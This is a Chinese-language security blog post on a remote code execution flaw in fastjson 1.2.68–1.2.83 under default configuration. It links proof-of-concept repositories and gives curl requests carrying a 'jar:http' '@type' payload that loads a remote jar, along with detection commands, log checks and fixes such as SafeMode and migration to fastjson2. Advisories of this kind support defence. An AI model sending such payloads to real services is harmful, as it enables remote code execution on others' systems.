---
title: "Fastjson 1.2.83 默认配置下的远程代码执行漏洞"
source: https://mrxn.net/jswz/fastjson-1-2-83-default-config-rce.html
asset_dir: embedded-base64
---

# 简介

2026 年 7 月 19 日，安全研究员 Kirill Firsov (@k\_firsov) 公开披露 fastjson 1.x 末代版本（1.2.68 至 1.2.83）存在一处远程代码执行[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")。攻击者通过 fastjson 默认 JSON 解析入口即可触发，不需要任何第三方[反序列化](https://mrxn.net/tag/rce "标签：反序列化") gadget chain（commons-collections / Spring AOP / JdbcRowSetImpl 等均不需要），未启用 SafeMode 的实例全部受影响。腾讯云安全中心已发布公开通告确认此影响范围。

配置安全指南

# 影响版本

> 触发入口：任何使用 fastjson 解析外部 JSON 的接口（HTTP API / RPC / MQ 消费者等）

fastjson 1.2.68 – 1.2.83（所有未开启 SafeMode 的实例）

> 不受影响：开启 SafeMode=true的 1.2.83 实例；fastjson 2.x

# 漏洞复现

深入探索

开发工具

黑客与破解

网络安全

> 特殊场景+默认fastjson 1.2.83 配置RCE，也算吧？  
> maybe 还有 jar:http 远程加载，目前还在研究中  
> 以及 jar:file 和 swing 都是可能的点
>
> 软件安全开发

直接看GitHub仓库：

- ~~<https://github.com/wouijvziqy/Fastjson-JsonType-RCE-PoC>~~ (已经被抬走了)
- <https://github.com/ThanatosXingYu/2026FastjsonPoC>
- <https://github.com/dinosn/fastjson-jsontype-rce-lab>

```
curl http://127.0.0.1:8081/info
curl -X POST http://127.0.0.1:8081/parse \
  -H 'Content-Type: application/json' \
  -d '{"@type":"jar:http:..2130706433:18080.probe!.POC","x":1}'
curl -X POST http://127.0.0.1:8081/parse-async \
  -H 'Content-Type: application/json' \
  -d '{"@type":"jar:http:..2130706433:18080.probe!.POC","x":1}'
```

深入探索

Java代码审查

教育资源

数字货币

当然还支持多个[Java](https://mrxn.net/tag/Java "标签：Java") jar URL形式如 jar:file:.. ,jar:https:..,jar:ftp:.. 这些常见的方式

Fastjson漏洞分析

# 排查方法

第 1 步：版本确认

```
# Maven 项目
find . -name "pom.xml" -exec grep -l "fastjson" {} \; \
  -exec grep -A1 "<artifactId>fastjson</artifactId>" {} \; | grep version

# Gradle 项目
grep -r "fastjson" --include="build.gradle" --include="build.gradle.kts" .

# 已部署的 jar 包
find / -name "fastjson-*.jar" 2>/dev/null

# 反编译确认（极端情况）
unzip -p fastjson-*.jar META-INF/MANIFEST.MF | grep -i version
```

深入探索

Fastjson安全配置

漏洞利用防御

计算机科学

判断标准：

漏洞修复建议

• 版本号 1.2.68 – 1.2.83+ 未开启 SafeMode→ 🔴 高危  
• 版本号 ≤ 1.2.67→ 同时存在其它历史[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")，更危险  
• 版本号 1.2.83 + 已开启 SafeMode→ 安全（仅针对当前漏洞）  
• 版本号 fastjson 2.x→ 安全

第 2 步：定位暴露入口

```
# 命中任意一条 → 暴露面存在
# ① 直接调用 fastjson 解析外部 JSON（最常见）
grep -rn "JSON\.parse\s*(\|JSON\.parseObject\s*(\|JSON\.parseArray\s*(" \
  --include="*.java" . | grep -v "test/" | grep -vE "(parse|parseObject|parseArray)\s*\(\s*\""

# ② Spring/Dubbo/HSF 配置使用 fastjson 作为 HTTP/RPC 编解码
grep -rn "FastJsonHttpMessageConverter\|FastJsonConfig\|fastjson" \
  --include="*.xml" --include="*.yml" --include="*.yaml" --include="*.properties" .
```

第 3 步：SafeMode 是否已开启（最关键）

安全研究报告

```
# JVM 启动参数检查
ps aux | grep -i "fastjson.parser.safeMode"

# 配置文件检查
grep -rn "fastjson.parser.safeMode\|setSafeMode" \
  --include="*.properties" --include="*.yml" --include="*.yaml" \
  --include="*.xml" --include="*.java" .
```

判断标准：未发现 safeMode=true→ 视为未防护。autoTypeSupport=false不算防护。

第 4 步：日志异常检查（历史攻击痕迹）

```
# fastjson autoType 相关异常
grep -iE "autoType is not support|safeMode not support|type not match" \
  /path/to/app/logs/*.log

# 可疑 @type 请求（WAF/网关日志）
grep -E '"@type"' /var/log/nginx/access.log* 2>/dev/null
```

# 修复建议

方案一：开启 SafeMode（首选，1 分钟生效，本版本唯一可靠防御）

在应用启动最早处加入：

```
ParserConfig.getGlobalInstance().setSafeMode(true);
```

或通过 JVM 启动参数（无需改代码）：

软件安全开发

```
java -Dfastjson.parser.safeMode=true -jar your-app.jar
```

副作用提示：开启 SafeMode 后所有 @type多态[反序列化](https://mrxn.net/tag/rce "标签：反序列化")失效。如果你的业务依赖 @type做动态类型分发，需要先把这部分逻辑改造为显式类型映射。

方案二：迁移到 fastjson 2.x（长期方案）

```
<!-- pom.xml -->
<dependency>
    <groupId>com.alibaba.fastjson2</groupId>
    <artifactId>fastjson2</artifactId>
    <version>2.0.53</version>
</dependency>
```

```
# Gradle
echo 'implementation "com.alibaba.fastjson2:fastjson2:2.0.53"' >> build.gradle
./gradlew build

# 验证
./gradlew dependencies | grep fastjson
```

fastjson2 从架构层面重新设计了 autoType，默认安全。如果业务代码量大，可保留 fastjson1 兼容包过渡：

```
<dependency>
    <groupId>com.alibaba.fastjson2</groupId>
    <artifactId>fastjson2-extension</artifactId>
    <version>2.0.53</version>
</dependency>
```

方案三：自定义白名单 Handler（临时缓解，无法立即重启服务时）

注册自定义白名单 handler，只允许已知的类通过：

```
ParserConfig.getGlobalInstance().addAutoTypeCheckHandler((typeName, expectClass, features) -> {
    if (WHITELIST.contains(typeName)) {
        return TypeUtils.loadClass(typeName);
    }
    return null;  // 返回 null 交给 fastjson 默认拒绝
});
```

> 注意：autoTypeSupport=false和黑名单扩充都不能防御此漏洞。请优先采用 SafeMode 或升级到 fastjson2。
>
> 漏洞修复建议

# 参考

- `https://x.com/k_firsov/status/2078872293745570032`
- `https://cloud.tencent.com/announce/detail/2375`
- `https://mp.weixin.qq.com/s/LVeBFi5kTYGAiHRQd0CPhg`
- <https://github.com/alibaba/fastjson2/wiki/Security-Advisory:-Remote-Code-Execution-in-fastjson-1.2.68%E2%80%931.2.83>
